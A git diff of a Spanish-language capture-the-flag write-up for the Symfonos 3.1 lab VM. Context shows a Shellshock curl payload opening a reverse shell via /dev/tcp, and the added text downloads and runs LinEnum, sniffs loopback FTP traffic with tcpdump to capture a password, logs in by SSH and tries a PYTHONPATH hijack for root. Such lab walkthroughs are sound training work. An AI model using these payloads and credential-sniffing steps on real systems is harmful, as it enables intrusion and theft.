@@ -129,13 +129,128 @@ root@kali:~# curl -i -H "User-agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10
 
 <img src="https://github.com/El-Palomo/SYMFONOS3.1/blob/main/symfonos7.jpg" width=80% />
 
+- Empezamos a enumerar nuevamente y ejecutamos LINENUM. No encontré nada importante.
+
+```
+cerberus@symfonos3:/usr/lib/cgi-bin$ cd /tmp
+cd /tmp
+cerberus@symfonos3:/tmp$ wget http://10.10.10.133/LinEnum.txt
+wget http://10.10.10.133/LinEnum.txt
+--2021-04-04 14:21:42--  http://10.10.10.133/LinEnum.txt
+Connecting to 10.10.10.133:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 46631 (46K) [text/plain]
+Saving to: 'LinEnum.txt'
+
+     0K .......... .......... .......... .......... .....     100%  118M=0s
+
+2021-04-04 14:21:42 (118 MB/s) - 'LinEnum.txt' saved [46631/46631]
+
+cerberus@symfonos3:/tmp$ ls -la
+ls -la
+total 56
+drwxrwxrwt  2 root     root      4096 Apr  4 14:21 .
+drwxr-xr-x 22 root     root      4096 Jul 19  2019 ..
+-rw-r--r--  1 cerberus cerberus 46631 Apr  2 20:51 LinEnum.txt
+cerberus@symfonos3:/tmp$ mv LinEnum.txt LinEnum.sh
+mv LinEnum.txt LinEnum.sh
+cerberus@symfonos3:/tmp$ chmod +x LinEnum.sh
+chmod +x LinEnum.sh
+cerberus@symfonos3:/tmp$ ./LinEnum.sh > LinEnum-output.txt
+./LinEnum.sh > LinEnum-output.txt
+./LinEnum.sh: line 219: echo: write error: Broken pipe
+./LinEnum.sh: line 252: echo: write error: Broken pipe
+```
+
+<img src="https://github.com/El-Palomo/SYMFONOS3.1/blob/main/symfonos8.jpg" width=80% />
+
+<img src="https://github.com/El-Palomo/SYMFONOS3.1/blob/main/symfonos9.jpg" width=80% />
+
+<img src="https://github.com/El-Palomo/SYMFONOS3.1/blob/main/symfonos10.jpg" width=80% />
+
+- Resaltan dos cosas: la ejecución de ftpclient.py y curl al localhost que guarda la información en la carpeta ftpclient.
+
+> Aquí viene el primer BUG de la VM. No es común poder ejecutar TCPDUMP sin privilegios de ROOT y efectivamente no funciona, sin embargo, si resturamos la VM  y ejecutamos el comando TCPDUMP a veces funciona. Algo no anda bien.
+
+```
+cerberus@symfonos3:/tmp$ tcpdump -w ftp-output.pcap -i ens33
+tcpdump -w ftp-output.pcap -i ens33
+tcpdump: ens33: You don't have permission to capture on that device
+(socket: Operation not permitted)
+```
+
+<img src="https://github.com/El-Palomo/SYMFONOS3.1/blob/main/symfonos11.jpg" width=80% />
+
+- Lo vuelvo a ejecutar y ahora si funciona (una cosa de locos). Dejemoslo corriendo unos minutos.
+
+```
+cerberus@symfonos3:/tmp$ tcpdump -w ftp-output.pcp -i lo
+tcpdump -w ftp-output.pcp -i lo
+tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
+
+```
+
+<img src="https://github.com/El-Palomo/SYMFONOS3.1/blob/main/symfonos12.jpg" width=80% />
+
+<img src="https://github.com/El-Palomo/SYMFONOS3.1/blob/main/symfonos13.jpg" width=80% />
+
+<img src="https://github.com/El-Palomo/SYMFONOS3.1/blob/main/symfonos14.jpg" width=80% />
 
 
+> Identificamos las siguientes credenciales: hades: PTpZTfU4vxgzvRBE. Ingresamos a través de SSH con las credenciales obtenidas.
+
+<img src="https://github.com/El-Palomo/SYMFONOS3.1/blob/main/symfonos15.jpg" width=80% />
 
 
+## 5. Escalando Privilegios
+
+- Toca probar todos los caminos posibles para elevar privilegios, habia un archivo que llamaba la atención en el proceso de enumeración en la carpeta OPT.
+- El archivo tiene toda la estructura de algo que se ejecuta periodicamente por un CRON, si pudieramos modificarlo esperariamos su ejecución y listo, sin embargo, NO TENEMOS PERMISO.
+
+```
+hades@symfonos3:~$ cd /opt
+hades@symfonos3:/opt$ ls -la
+total 12
+drwxr-xr-x  3 root root  4096 Jul 20  2019 .
+drwxr-xr-x 22 root root  4096 Jul 19  2019 ..
+drwxr-x---  2 root hades 4096 Apr  6  2020 ftpclient
+hades@symfonos3:/opt$ cd ftpclient
+hades@symfonos3:/opt/ftpclient$ ls -la
+total 16
+drwxr-x--- 2 root hades 4096 Apr  6  2020 .
+drwxr-xr-x 3 root root  4096 Jul 20  2019 ..
+-rw-r--r-- 1 root hades  262 Apr  6  2020 ftpclient.py
+-rw-r--r-- 1 root hades  251 Apr  4 15:07 statuscheck.txt
+hades@symfonos3:/opt/ftpclient$ cat ftpclient.py
+import ftplib
+
+ftp = ftplib.FTP('127.0.0.1')
+ftp.login(user='hades', passwd='PTpZTfU4vxgzvRBE')
+
+ftp.cwd('/srv/ftp/')
+
+def upload():
+    filename = '/opt/client/statuscheck.txt'
+    ftp.storbinary('STOR '+filename, open(filename, 'rb'))
+    ftp.quit()
+
+upload()
+```
+
+<img src="https://github.com/El-Palomo/SYMFONOS3.1/blob/main/symfonos16.jpg" width=80% />
+
+- Hasta este punto llegué en mi proceso de resolución. Aquí revisé como lo resolvieron otras personas y difieren los caminos, algunos muestran que si pueden editar el archivo FTPCLIENT.PY y otros indican que pueden modificar la libreria FTPLIB pero tampoco se puede.
 
 
+<img src="https://github.com/El-Palomo/SYMFONOS3.1/blob/main/symfonos17.jpg" width=80% />
+
+- Finalmente, pensé en modificar el PATH de PYTHON y espere la ejecución del CRON  pero no funcionó, la modificación del PATH solo funciona por usuario.
 
 
+```
+hades@symfonos3:/usr/lib/python2.7$ export PYTHONPATH='/tmp'
+hades@symfonos3:/usr/lib/python2.7$ python -c "import sys; print(sys.path)"
+['', '/tmp', '/usr/lib/python2.7', '/usr/lib/python2.7/plat-x86_64-linux-gnu', '/usr/lib/python2.7/lib-tk', '/usr/lib/python2.7/lib-old', '/usr/lib/python2.7/lib-dynload', '/usr/local/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages']
+```
 
 
